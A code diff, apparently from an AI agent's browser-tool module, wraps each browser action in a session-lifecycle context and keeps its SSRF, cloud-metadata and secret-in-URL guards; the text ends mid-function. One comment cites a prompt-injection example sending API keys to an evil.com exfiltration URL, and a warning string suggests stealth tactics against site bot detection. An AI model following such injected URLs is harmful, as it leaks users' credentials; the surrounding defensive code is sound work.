@@ -2371,193 +2371,196 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with navigation result (includes stealth features info on first nav)
     """
-    # Secret exfiltration protection — block URLs that embed API keys or
-    # tokens in query parameters. A prompt injection could trick the agent
-    # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
-    # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
-    import urllib.parse
-    from agent.redact import _PREFIX_RE
-    url_decoded = urllib.parse.unquote(url)
-    if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
-        return json.dumps({
-            "success": False,
-            "error": "Blocked: URL contains what appears to be an API key or token. "
-                     "Secrets must not be sent in URLs.",
-        })
+    from superforecasting_agent.hosting.browser_sessions import browser_session_lifecycle
 
-    # SSRF protection — block private/internal addresses before navigating.
-    # Skipped for local backends (Camofox, headless Chromium without a cloud
-    # provider) because the agent already has full local network access via
-    # the terminal tool.  Also skipped when hybrid routing will auto-spawn a
-    # local Chromium sidecar for this URL (cloud provider configured +
-    # private URL + ``browser.auto_local_for_private_urls`` enabled) — the
-    # cloud provider never sees the URL in that case.  Can also be opted
-    # out globally via ``browser.allow_private_urls`` in config.
-    effective_task_id = task_id or "default"
-    nav_session_key = _navigation_session_key(effective_task_id, url)
-    auto_local_this_nav = _is_local_sidecar_key(nav_session_key)
-
-    # Always-blocked floor: cloud metadata / IMDS endpoints are denied
-    # regardless of backend, hybrid routing, or allow_private_urls.
-    # There's no legitimate agent use case for navigating to
-    # 169.254.169.254 / metadata.google.internal / ECS task metadata
-    # via a browser, and routing those to a local Chromium sidecar
-    # on an EC2/GCP/Azure host exfiltrates IAM credentials (#16234).
-    if not _is_local_backend() and _is_always_blocked_url(url):
-        return json.dumps({
-            "success": False,
-            "error": "Blocked: URL targets a cloud metadata endpoint",
-        })
-
-    if (
-        not _is_local_backend()
-        and not auto_local_this_nav
-        and not _allow_private_urls()
-        and not _is_safe_url(url)
-    ):
-        return json.dumps({
-            "success": False,
-            "error": "Blocked: URL targets a private or internal address",
-        })
-
-    # Website policy check — block before navigating
-    blocked = check_website_access(url)
-    if blocked:
-        return json.dumps({
-            "success": False,
-            "error": blocked["message"],
-            "blocked_by_policy": {"host": blocked["host"], "rule": blocked["rule"], "source": blocked["source"]},
-        })
-
-    # Camofox backend — delegate after safety checks pass
-    if _is_camofox_mode():
-        from tools.browser_camofox import camofox_navigate
-        return camofox_navigate(url, task_id)
-
-    if auto_local_this_nav:
-        logger.info(
-            "browser_navigate: auto-routing %s to local Chromium sidecar "
-            "(cloud provider %s stays on cloud for public URLs; "
-            "set browser.auto_local_for_private_urls: false to disable)",
-            url,
-            type(_get_cloud_provider()).__name__ if _get_cloud_provider() else "none",
-        )
-
-    # Get session info to check if this is a new session
-    # (will create one with features logged if not exists)
-    session_info = _get_session_info(nav_session_key)
-    is_first_nav = session_info.get("_first_nav", True)
-
-    # Auto-start recording if configured and this is first navigation
-    if is_first_nav:
-        session_info["_first_nav"] = False
-        _maybe_start_recording(nav_session_key)
-
-    result = _run_browser_command(nav_session_key, "open", [url], timeout=max(_get_command_timeout(), 60))
-
-    # Remember which session served this nav so snapshot/click/fill/...
-    # on the same task_id hit it (critical when hybrid routing has both a
-    # cloud session and a local sidecar alive concurrently).
-    _last_active_session_key[effective_task_id] = nav_session_key
-
-    if result.get("success"):
-        data = result.get("data", {})
-        title = data.get("title", "")
-        final_url = data.get("url", url)
-
-        # Post-redirect SSRF check — if the browser followed a redirect to a
-        # private/internal address, block the result so the model can't read
-        # internal content via subsequent browser_snapshot calls.
-        # Skipped for local backends (same rationale as the pre-nav check),
-        # and for the hybrid local sidecar (we're already on a local browser
-        # hitting a private URL by design).
-        # Always-blocked floor (cloud metadata / IMDS) is enforced even
-        # when auto_local_this_nav is true — see pre-nav check for
-        # rationale (#16234).
-        if (
-            not _is_local_backend()
-            and final_url
-            and final_url != url
-            and _is_always_blocked_url(final_url)
-        ):
-            _run_browser_command(nav_session_key, "open", ["about:blank"], timeout=10)
+    with browser_session_lifecycle((task_id or "default").removesuffix("::local")):
+        # Secret exfiltration protection — block URLs that embed API keys or
+        # tokens in query parameters. A prompt injection could trick the agent
+        # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
+        # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
+        import urllib.parse
+        from agent.redact import _PREFIX_RE
+        url_decoded = urllib.parse.unquote(url)
+        if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
             return json.dumps({
                 "success": False,
-                "error": "Blocked: redirect landed on a cloud metadata endpoint",
+                "error": "Blocked: URL contains what appears to be an API key or token. "
+                         "Secrets must not be sent in URLs.",
+            })
+
+        # SSRF protection — block private/internal addresses before navigating.
+        # Skipped for local backends (Camofox, headless Chromium without a cloud
+        # provider) because the agent already has full local network access via
+        # the terminal tool.  Also skipped when hybrid routing will auto-spawn a
+        # local Chromium sidecar for this URL (cloud provider configured +
+        # private URL + ``browser.auto_local_for_private_urls`` enabled) — the
+        # cloud provider never sees the URL in that case.  Can also be opted
+        # out globally via ``browser.allow_private_urls`` in config.
+        effective_task_id = task_id or "default"
+        nav_session_key = _navigation_session_key(effective_task_id, url)
+        auto_local_this_nav = _is_local_sidecar_key(nav_session_key)
+
+        # Always-blocked floor: cloud metadata / IMDS endpoints are denied
+        # regardless of backend, hybrid routing, or allow_private_urls.
+        # There's no legitimate agent use case for navigating to
+        # 169.254.169.254 / metadata.google.internal / ECS task metadata
+        # via a browser, and routing those to a local Chromium sidecar
+        # on an EC2/GCP/Azure host exfiltrates IAM credentials (#16234).
+        if not _is_local_backend() and _is_always_blocked_url(url):
+            return json.dumps({
+                "success": False,
+                "error": "Blocked: URL targets a cloud metadata endpoint",
             })
 
         if (
             not _is_local_backend()
             and not auto_local_this_nav
             and not _allow_private_urls()
-            and final_url and final_url != url and not _is_safe_url(final_url)
+            and not _is_safe_url(url)
         ):
-            # Navigate away to a blank page to prevent snapshot leaks
-            _run_browser_command(nav_session_key, "open", ["about:blank"], timeout=10)
             return json.dumps({
                 "success": False,
-                "error": "Blocked: redirect landed on a private/internal address",
+                "error": "Blocked: URL targets a private or internal address",
             })
 
-        response = {
-            "success": True,
-            "url": final_url,
-            "title": title
-        }
-        _copy_fallback_warning(response, result)
+        # Website policy check — block before navigating
+        blocked = check_website_access(url)
+        if blocked:
+            return json.dumps({
+                "success": False,
+                "error": blocked["message"],
+                "blocked_by_policy": {"host": blocked["host"], "rule": blocked["rule"], "source": blocked["source"]},
+            })
 
-        # Detect common "blocked" page patterns from title/url
-        blocked_patterns = [
-            "access denied", "access to this page has been denied",
-            "blocked", "bot detected", "verification required",
-            "please verify", "are you a robot", "captcha",
-            "cloudflare", "ddos protection", "checking your browser",
-            "just a moment", "attention required"
-        ]
-        title_lower = title.lower()
+        # Camofox backend — delegate after safety checks pass
+        if _is_camofox_mode():
+            from tools.browser_camofox import camofox_navigate
+            return camofox_navigate(url, task_id)
 
-        if any(pattern in title_lower for pattern in blocked_patterns):
-            response["bot_detection_warning"] = (
-                f"Page title '{title}' suggests bot detection. The site may have blocked this request. "
-                "Options: 1) Try adding delays between actions, 2) Access different pages first, "
-                "3) Enable advanced stealth (BROWSERBASE_ADVANCED_STEALTH=true, requires Scale plan), "
-                "4) Some sites have very aggressive bot detection that may be unavoidable."
+        if auto_local_this_nav:
+            logger.info(
+                "browser_navigate: auto-routing %s to local Chromium sidecar "
+                "(cloud provider %s stays on cloud for public URLs; "
+                "set browser.auto_local_for_private_urls: false to disable)",
+                url,
+                type(_get_cloud_provider()).__name__ if _get_cloud_provider() else "none",
             )
 
-        # Include feature info on first navigation so model knows what's active
-        if is_first_nav and "features" in session_info:
-            features = session_info["features"]
-            active_features = [k for k, v in features.items() if v]
-            if not features.get("proxies"):
-                response["stealth_warning"] = (
-                    "Running WITHOUT residential proxies. Bot detection may be more aggressive. "
-                    "Consider upgrading Browserbase plan for proxy support."
+        # Get session info to check if this is a new session
+        # (will create one with features logged if not exists)
+        session_info = _get_session_info(nav_session_key)
+        is_first_nav = session_info.get("_first_nav", True)
+
+        # Auto-start recording if configured and this is first navigation
+        if is_first_nav:
+            session_info["_first_nav"] = False
+            _maybe_start_recording(nav_session_key)
+
+        result = _run_browser_command(nav_session_key, "open", [url], timeout=max(_get_command_timeout(), 60))
+
+        # Remember which session served this nav so snapshot/click/fill/...
+        # on the same task_id hit it (critical when hybrid routing has both a
+        # cloud session and a local sidecar alive concurrently).
+        _last_active_session_key[effective_task_id] = nav_session_key
+
+        if result.get("success"):
+            data = result.get("data", {})
+            title = data.get("title", "")
+            final_url = data.get("url", url)
+
+            # Post-redirect SSRF check — if the browser followed a redirect to a
+            # private/internal address, block the result so the model can't read
+            # internal content via subsequent browser_snapshot calls.
+            # Skipped for local backends (same rationale as the pre-nav check),
+            # and for the hybrid local sidecar (we're already on a local browser
+            # hitting a private URL by design).
+            # Always-blocked floor (cloud metadata / IMDS) is enforced even
+            # when auto_local_this_nav is true — see pre-nav check for
+            # rationale (#16234).
+            if (
+                not _is_local_backend()
+                and final_url
+                and final_url != url
+                and _is_always_blocked_url(final_url)
+            ):
+                _run_browser_command(nav_session_key, "open", ["about:blank"], timeout=10)
+                return json.dumps({
+                    "success": False,
+                    "error": "Blocked: redirect landed on a cloud metadata endpoint",
+                })
+
+            if (
+                not _is_local_backend()
+                and not auto_local_this_nav
+                and not _allow_private_urls()
+                and final_url and final_url != url and not _is_safe_url(final_url)
+            ):
+                # Navigate away to a blank page to prevent snapshot leaks
+                _run_browser_command(nav_session_key, "open", ["about:blank"], timeout=10)
+                return json.dumps({
+                    "success": False,
+                    "error": "Blocked: redirect landed on a private/internal address",
+                })
+
+            response = {
+                "success": True,
+                "url": final_url,
+                "title": title
+            }
+            _copy_fallback_warning(response, result)
+
+            # Detect common "blocked" page patterns from title/url
+            blocked_patterns = [
+                "access denied", "access to this page has been denied",
+                "blocked", "bot detected", "verification required",
+                "please verify", "are you a robot", "captcha",
+                "cloudflare", "ddos protection", "checking your browser",
+                "just a moment", "attention required"
+            ]
+            title_lower = title.lower()
+
+            if any(pattern in title_lower for pattern in blocked_patterns):
+                response["bot_detection_warning"] = (
+                    f"Page title '{title}' suggests bot detection. The site may have blocked this request. "
+                    "Options: 1) Try adding delays between actions, 2) Access different pages first, "
+                    "3) Enable advanced stealth (BROWSERBASE_ADVANCED_STEALTH=true, requires Scale plan), "
+                    "4) Some sites have very aggressive bot detection that may be unavoidable."
                 )
-            response["stealth_features"] = active_features
 
-        # Auto-take a compact snapshot so the model can act immediately
-        # without a separate browser_snapshot call.
-        try:
-            snap_result = _run_browser_command(nav_session_key, "snapshot", ["-c"])
-            if snap_result.get("success"):
-                snap_data = snap_result.get("data", {})
-                snapshot_text = snap_data.get("snapshot", "")
-                refs = snap_data.get("refs", {})
-                if len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD:
-                    snapshot_text = _truncate_snapshot(snapshot_text)
-                response["snapshot"] = snapshot_text
-                response["element_count"] = len(refs) if refs else 0
-                if snap_result.get("fallback_warning") and not response.get("fallback_warning"):
-                    _copy_fallback_warning(response, snap_result)
-        except Exception as e:
-            logger.debug("Auto-snapshot after navigate failed: %s", e)
+            # Include feature info on first navigation so model knows what's active
+            if is_first_nav and "features" in session_info:
+                features = session_info["features"]
+                active_features = [k for k, v in features.items() if v]
+                if not features.get("proxies"):
+                    response["stealth_warning"] = (
+                        "Running WITHOUT residential proxies. Bot detection may be more aggressive. "
+                        "Consider upgrading Browserbase plan for proxy support."
+                    )
+                response["stealth_features"] = active_features
 
-        return json.dumps(response, ensure_ascii=False)
-    else:
-        return json.dumps({
-            "success": False,
-            "error": result.get("error", "Navigation failed")
-        }, ensure_ascii=False)
+            # Auto-take a compact snapshot so the model can act immediately
+            # without a separate browser_snapshot call.
+            try:
+                snap_result = _run_browser_command(nav_session_key, "snapshot", ["-c"])
+                if snap_result.get("success"):
+                    snap_data = snap_result.get("data", {})
+                    snapshot_text = snap_data.get("snapshot", "")
+                    refs = snap_data.get("refs", {})
+                    if len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD:
+                        snapshot_text = _truncate_snapshot(snapshot_text)
+                    response["snapshot"] = snapshot_text
+                    response["element_count"] = len(refs) if refs else 0
+                    if snap_result.get("fallback_warning") and not response.get("fallback_warning"):
+                        _copy_fallback_warning(response, snap_result)
+            except Exception as e:
+                logger.debug("Auto-snapshot after navigate failed: %s", e)
+
+            return json.dumps(response, ensure_ascii=False)
+        else:
+            return json.dumps({
+                "success": False,
+                "error": result.get("error", "Navigation failed")
+            }, ensure_ascii=False)
 
 
 def browser_snapshot(
@@ -2576,57 +2579,60 @@ def browser_snapshot(
     Returns:
         JSON string with page snapshot
     """
-    if _is_camofox_mode():
-        from tools.browser_camofox import camofox_snapshot
-        return camofox_snapshot(full, task_id, user_task)
+    from superforecasting_agent.hosting.browser_sessions import browser_session_lifecycle
 
-    effective_task_id = _last_session_key(task_id or "default")
+    with browser_session_lifecycle((task_id or "default").removesuffix("::local")):
+        if _is_camofox_mode():
+            from tools.browser_camofox import camofox_snapshot
+            return camofox_snapshot(full, task_id, user_task)
 
-    # Build command args based on full flag
-    args = []
-    if not full:
-        args.extend(["-c"])  # Compact mode
+        effective_task_id = _last_session_key(task_id or "default")
 
-    result = _run_browser_command(effective_task_id, "snapshot", args)
+        # Build command args based on full flag
+        args = []
+        if not full:
+            args.extend(["-c"])  # Compact mode
 
-    if result.get("success"):
-        data = result.get("data", {})
-        snapshot_text = data.get("snapshot", "")
-        refs = data.get("refs", {})
+        result = _run_browser_command(effective_task_id, "snapshot", args)
 
-        # Check if snapshot needs summarization
-        if len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD and user_task:
-            snapshot_text = _extract_relevant_content(snapshot_text, user_task)
-        elif len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD:
-            snapshot_text = _truncate_snapshot(snapshot_text)
+        if result.get("success"):
+            data = result.get("data", {})
+            snapshot_text = data.get("snapshot", "")
+            refs = data.get("refs", {})
 
-        response = {
-            "success": True,
-            "snapshot": snapshot_text,
-            "element_count": len(refs) if refs else 0
-        }
-        _copy_fallback_warning(response, result)
+            # Check if snapshot needs summarization
+            if len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD and user_task:
+                snapshot_text = _extract_relevant_content(snapshot_text, user_task)
+            elif len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD:
+                snapshot_text = _truncate_snapshot(snapshot_text)
 
-        # Merge supervisor state (pending dialogs + frame tree) when a CDP
-        # supervisor is attached to this task. No-op otherwise. See
-        # website/docs/developer-guide/browser-supervisor.md.
-        try:
-            from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
-            _supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
-            if _supervisor is not None:
-                _sv_snap = _supervisor.snapshot()
-                if _sv_snap.active:
-                    response.update(_sv_snap.to_dict())
-        except Exception as _sv_exc:
-            logger.debug("supervisor snapshot merge failed: %s", _sv_exc)
+            response = {
+                "success": True,
+                "snapshot": snapshot_text,
+                "element_count": len(refs) if refs else 0
+            }
+            _copy_fallback_warning(response, result)
 
-        return json.dumps(response, ensure_ascii=False)
-    else:
-        response = {
-            "success": False,
-            "error": result.get("error", "Failed to get snapshot")
-        }
-        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
+            # Merge supervisor state (pending dialogs + frame tree) when a CDP
+            # supervisor is attached to this task. No-op otherwise. See
+            # website/docs/developer-guide/browser-supervisor.md.
+            try:
+                from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
+                _supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
+                if _supervisor is not None:
+                    _sv_snap = _supervisor.snapshot()
+                    if _sv_snap.active:
+                        response.update(_sv_snap.to_dict())
+            except Exception as _sv_exc:
+                logger.debug("supervisor snapshot merge failed: %s", _sv_exc)
+
+            return json.dumps(response, ensure_ascii=False)
+        else:
+            response = {
+                "success": False,
+                "error": result.get("error", "Failed to get snapshot")
+            }
+            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
 
 
 def browser_click(ref: str, task_id: Optional[str] = None) -> str:
@@ -2640,30 +2646,33 @@ def browser_click(ref: str, task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with click result
     """
-    if _is_camofox_mode():
-        from tools.browser_camofox import camofox_click
-        return camofox_click(ref, task_id)
+    from superforecasting_agent.hosting.browser_sessions import browser_session_lifecycle
 
-    effective_task_id = _last_session_key(task_id or "default")
+    with browser_session_lifecycle((task_id or "default").removesuffix("::local")):
+        if _is_camofox_mode():
+            from tools.browser_camofox import camofox_click
+            return camofox_click(ref, task_id)
 
-    # Ensure ref starts with @
-    if not ref.startswith("@"):
-        ref = f"@{ref}"
+        effective_task_id = _last_session_key(task_id or "default")
 
-    result = _run_browser_command(effective_task_id, "click", [ref])
+        # Ensure ref starts with @
+        if not ref.startswith("@"):
+            ref = f"@{ref}"
 
-    if result.get("success"):
-        response = {
-            "success": True,
-            "clicked": ref
-        }
-        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
-    else:
-        response = {
-            "success": False,
-            "error": result.get("error", f"Failed to click {ref}")
-        }
-        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
+        result = _run_browser_command(effective_task_id, "click", [ref])
+
+        if result.get("success"):
+            response = {
+                "success": True,
+                "clicked": ref
+            }
+            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
+        else:
+            response = {
+                "success": False,
+                "error": result.get("error", f"Failed to click {ref}")
+            }
+            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
 
 
 def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
@@ -2678,32 +2687,35 @@ def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with type result
     """
-    if _is_camofox_mode():
-        from tools.browser_camofox import camofox_type
-        return camofox_type(ref, text, task_id)
+    from superforecasting_agent.hosting.browser_sessions import browser_session_lifecycle
 
-    effective_task_id = _last_session_key(task_id or "default")
+    with browser_session_lifecycle((task_id or "default").removesuffix("::local")):
+        if _is_camofox_mode():
+            from tools.browser_camofox import camofox_type
+            return camofox_type(ref, text, task_id)
 
-    # Ensure ref starts with @
-    if not ref.startswith("@"):
-        ref = f"@{ref}"
+        effective_task_id = _last_session_key(task_id or "default")
 
-    # Use fill command (clears then types)
-    result = _run_browser_command(effective_task_id, "fill", [ref, text])
+        # Ensure ref starts with @
+        if not ref.startswith("@"):
+            ref = f"@{ref}"
 
-    if result.get("success"):
-        response = {
-            "success": True,
-            "typed": text,
-            "element": ref
-        }
-        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
-    else:
-        response = {
-            "success": False,
-            "error": result.get("error", f"Failed to type into {ref}")
-        }
-        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
+        # Use fill command (clears then types)
+        result = _run_browser_command(effective_task_id, "fill", [ref, text])
+
+        if result.get("success"):
+            response = {
+                "success": True,
+                "typed": text,
+                "element": ref
+            }
+            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
+        else:
+            response = {
+                "success": False,
+                "error": result.get("error", f"Failed to type into {ref}")
+            }
+            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
 
 
 def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
@@ -2717,42 +2729,45 @@ def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with scroll result
     """
-    # Validate direction
-    if direction not in {"up", "down"}:
-        return json.dumps({
-            "success": False,
-            "error": f"Invalid direction '{direction}'. Use 'up' or 'down'."
-        }, ensure_ascii=False)
+    from superforecasting_agent.hosting.browser_sessions import browser_session_lifecycle
 
-    # Single scroll with pixel amount instead of 5x subprocess calls.
-    # agent-browser supports: agent-browser scroll down 500
-    # ~500px is roughly half a viewport of travel.
-    _SCROLL_PIXELS = 500
+    with browser_session_lifecycle((task_id or "default").removesuffix("::local")):
+        # Validate direction
+        if direction not in {"up", "down"}:
+            return json.dumps({
+                "success": False,
+                "error": f"Invalid direction '{direction}'. Use 'up' or 'down'."
+            }, ensure_ascii=False)
 
-    if _is_camofox_mode():
-        from tools.browser_camofox import camofox_scroll
-        # Camofox REST API doesn't support pixel args; use repeated calls
-        _SCROLL_REPEATS = 5
-        result = None
-        for _ in range(_SCROLL_REPEATS):
-            result = camofox_scroll(direction, task_id)
-        return result
+        # Single scroll with pixel amount instead of 5x subprocess calls.
+        # agent-browser supports: agent-browser scroll down 500
+        # ~500px is roughly half a viewport of travel.
+        _SCROLL_PIXELS = 500
 
-    effective_task_id = _last_session_key(task_id or "default")
+        if _is_camofox_mode():
+            from tools.browser_camofox import camofox_scroll
+            # Camofox REST API doesn't support pixel args; use repeated calls
+            _SCROLL_REPEATS = 5
+            result = None
+            for _ in range(_SCROLL_REPEATS):
+                result = camofox_scroll(direction, task_id)
+            return result
 
-    result = _run_browser_command(effective_task_id, "scroll", [direction, str(_SCROLL_PIXELS)])
-    if not result.get("success"):
+        effective_task_id = _last_session_key(task_id or "default")
+
+        result = _run_browser_command(effective_task_id, "scroll", [direction, str(_SCROLL_PIXELS)])
+        if not result.get("success"):
+            response = {
+                "success": False,
+                "error": result.get("error", f"Failed to scroll {direction}")
+            }
+            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
+
         response = {
-            "success": False,
-            "error": result.get("error", f"Failed to scroll {direction}")
+            "success": True,
+            "scrolled": direction
         }
         return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
-
-    response = {
-        "success": True,
-        "scrolled": direction
-    }
-    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
 
 
 def browser_back(task_id: Optional[str] = None) -> str:
@@ -2765,26 +2780,29 @@ def browser_back(task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with navigation result
     """
-    if _is_camofox_mode():
-        from tools.browser_camofox import camofox_back
-        return camofox_back(task_id)
+    from superforecasting_agent.hosting.browser_sessions import browser_session_lifecycle
 
-    effective_task_id = _last_session_key(task_id or "default")
-    result = _run_browser_command(effective_task_id, "back", [])
+    with browser_session_lifecycle((task_id or "default").removesuffix("::local")):
+        if _is_camofox_mode():
+            from tools.browser_camofox import camofox_back
+            return camofox_back(task_id)
 
-    if result.get("success"):
-        data = result.get("data", {})
-        response = {
-            "success": True,
-            "url": data.get("url", "")
-        }
-        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
-    else:
-        response = {
-            "success": False,
-            "error": result.get("error", "Failed to go back")
-        }
-        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
+        effective_task_id = _last_session_key(task_id or "default")
+        result = _run_browser_command(effective_task_id, "back", [])
+
+        if result.get("success"):
+            data = result.get("data", {})
+            response = {
+                "success": True,
+                "url": data.get("url", "")
+            }
+            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
+        else:
+            response = {
+                "success": False,
+                "error": result.get("error", "Failed to go back")
+            }
+            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
 
 
 def browser_press(key: str, task_id: Optional[str] = None) -> str:
@@ -2798,25 +2816,28 @@ def browser_press(key: str, task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with key press result
     """
-    if _is_camofox_mode():
-        from tools.browser_camofox import camofox_press
-        return camofox_press(key, task_id)
+    from superforecasting_agent.hosting.browser_sessions import browser_session_lifecycle
 
-    effective_task_id = _last_session_key(task_id or "default")
-    result = _run_browser_command(effective_task_id, "press", [key])
+    with browser_session_lifecycle((task_id or "default").removesuffix("::local")):
+        if _is_camofox_mode():
+            from tools.browser_camofox import camofox_press
+            return camofox_press(key, task_id)
 
-    if result.get("success"):
-        response = {
-            "success": True,
-            "pressed": key
-        }
-        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
-    else:
-        response = {
-            "success": False,
-            "error": result.get("error", f"Failed to press {key}")
-        }
-        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
+        effective_task_id = _last_session_key(task_id or "default")
+        result = _run_browser_command(effective_task_id, "press", [key])
+
+        if result.get("success"):
+            response = {
+                "success": True,
+                "pressed": key
+            }
+            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
+        else:
+            response = {
+                "success": False,
+                "error": result.get("error", f"Failed to press {key}")
+            }
+            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
 
 
 
@@ -2837,51 +2858,54 @@ def browser_console(clear: bool = False, expression: Optional[str] = None, task_
     Returns:
         JSON string with console messages/errors, or eval result
     """
-    # --- JS evaluation mode ---
-    if expression is not None:
-        return _browser_eval(expression, task_id)
+    from superforecasting_agent.hosting.browser_sessions import browser_session_lifecycle
 
-    # --- Console output mode (original behaviour) ---
-    if _is_camofox_mode():
-        from tools.browser_camofox import camofox_console
-        return camofox_console(clear, task_id)
+    with browser_session_lifecycle((task_id or "default").removesuffix("::local")):
+        # --- JS evaluation mode ---
+        if expression is not None:
+            return _browser_eval(expression, task_id)
 
-    effective_task_id = _last_session_key(task_id or "default")
+        # --- Console output mode (original behaviour) ---
+        if _is_camofox_mode():
+            from tools.browser_camofox import camofox_console
+            return camofox_console(clear, task_id)
 
-    console_args = ["--clear"] if clear else []
-    error_args = ["--clear"] if clear else []
+        effective_task_id = _last_session_key(task_id or "default")
 
-    console_result = _run_browser_command(effective_task_id, "console", console_args)
-    errors_result = _run_browser_command(effective_task_id, "errors", error_args)
+        console_args = ["--clear"] if clear else []
+        error_args = ["--clear"] if clear else []
 
-    messages = []
-    if console_result.get("success"):
-        for msg in console_result.get("data", {}).get("messages", []):
-            messages.append({
-                "type": msg.get("type", "log"),
-                "text": msg.get("text", ""),
-                "source": "console",
-            })
+        console_result = _run_browser_command(effective_task_id, "console", console_args)
+        errors_result = _run_browser_command(effective_task_id, "errors", error_args)
 
-    errors = []
-    if errors_result.get("success"):
-        for err in errors_result.get("data", {}).get("errors", []):
-            errors.append({
-                "message": err.get("message", ""),
-                "source": "exception",
-            })
+        messages = []
+        if console_result.get("success"):
+            for msg in console_result.get("data", {}).get("messages", []):
+                messages.append({
+                    "type": msg.get("type", "log"),
+                    "text": msg.get("text", ""),
+                    "source": "console",
+                })
 
-    response = {
-        "success": True,
-        "console_messages": messages,
-        "js_errors": errors,
-        "total_messages": len(messages),
-        "total_errors": len(errors),
-    }
-    _copy_fallback_warning(response, console_result)
-    if errors_result.get("fallback_warning") and not response.get("fallback_warning"):
-        _copy_fallback_warning(response, errors_result)
-    return json.dumps(response, ensure_ascii=False)
+        errors = []
+        if errors_result.get("success"):
+            for err in errors_result.get("data", {}).get("errors", []):
+                errors.append({
+                    "message": err.get("message", ""),
+                    "source": "exception",
+                })
+
+        response = {
+            "success": True,
+            "console_messages": messages,
+            "js_errors": errors,
+            "total_messages": len(messages),
+            "total_errors": len(errors),
+        }
+        _copy_fallback_warning(response, console_result)
+        if errors_result.get("fallback_warning") and not response.get("fallback_warning"):
+            _copy_fallback_warning(response, errors_result)
+        return json.dumps(response, ensure_ascii=False)
 
 
 def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
@@ -3069,14 +3093,17 @@ def browser_get_images(task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with list of images (src and alt)
     """
-    if _is_camofox_mode():
-        from tools.browser_camofox import camofox_get_images
-        return camofox_get_images(task_id)
+    from superforecasting_agent.hosting.browser_sessions import browser_session_lifecycle
 
-    effective_task_id = _last_session_key(task_id or "default")
+    with browser_session_lifecycle((task_id or "default").removesuffix("::local")):
+        if _is_camofox_mode():
+            from tools.browser_camofox import camofox_get_images
+            return camofox_get_images(task_id)
 
-    # Use eval to run JavaScript that extracts images
-    js_code = """JSON.stringify(
+        effective_task_id = _last_session_key(task_id or "default")
+
+        # Use eval to run JavaScript that extracts images
+        js_code = """JSON.stringify(
         [...document.images].map(img => ({
             src: img.src,
             alt: img.alt || '',
@@ -3085,56 +3112,56 @@ def browser_get_images(task_id: Optional[str] = None) -> str:
         })).filter(img => img.src && !img.src.startsWith('data:'))
     )"""
 
-    result = _run_browser_command(effective_task_id, "eval", [js_code])
+        result = _run_browser_command(effective_task_id, "eval", [js_code])
 
-    if result.get("success"):
-        # ── Private-network guard ───────────────────────────────────────────
-        # browser_get_images bypasses _browser_eval and calls the eval command
-        # directly, so it must re-check the live page URL itself.  A JavaScript
-        # navigation (e.g. via browser_console) to a private/internal address
-        # would otherwise leak image src URLs and alt text from that page.
-        if _eval_ssrf_guard_active(effective_task_id):
-            _blocked_url = _current_page_private_url(effective_task_id)
-            if _blocked_url:
-                return json.dumps({
-                    "success": False,
-                    "error": (
-                        "Blocked: page URL targets a private or internal address "
-                        f"({_blocked_url}). This may have been caused by a "
-                        "JavaScript navigation via browser_console."
-                    ),
-                }, ensure_ascii=False)
+        if result.get("success"):
+            # ── Private-network guard ───────────────────────────────────────────
+            # browser_get_images bypasses _browser_eval and calls the eval command
+            # directly, so it must re-check the live page URL itself.  A JavaScript
+            # navigation (e.g. via browser_console) to a private/internal address
+            # would otherwise leak image src URLs and alt text from that page.
+            if _eval_ssrf_guard_active(effective_task_id):
+                _blocked_url = _current_page_private_url(effective_task_id)
+                if _blocked_url:
+                    return json.dumps({
+                        "success": False,
+                        "error": (
+                            "Blocked: page URL targets a private or internal address "
+                            f"({_blocked_url}). This may have been caused by a "
+                            "JavaScript navigation via browser_console."
+                        ),
+                    }, ensure_ascii=False)
 
-        data = result.get("data", {})
-        raw_result = data.get("result", "[]")
+            data = result.get("data", {})
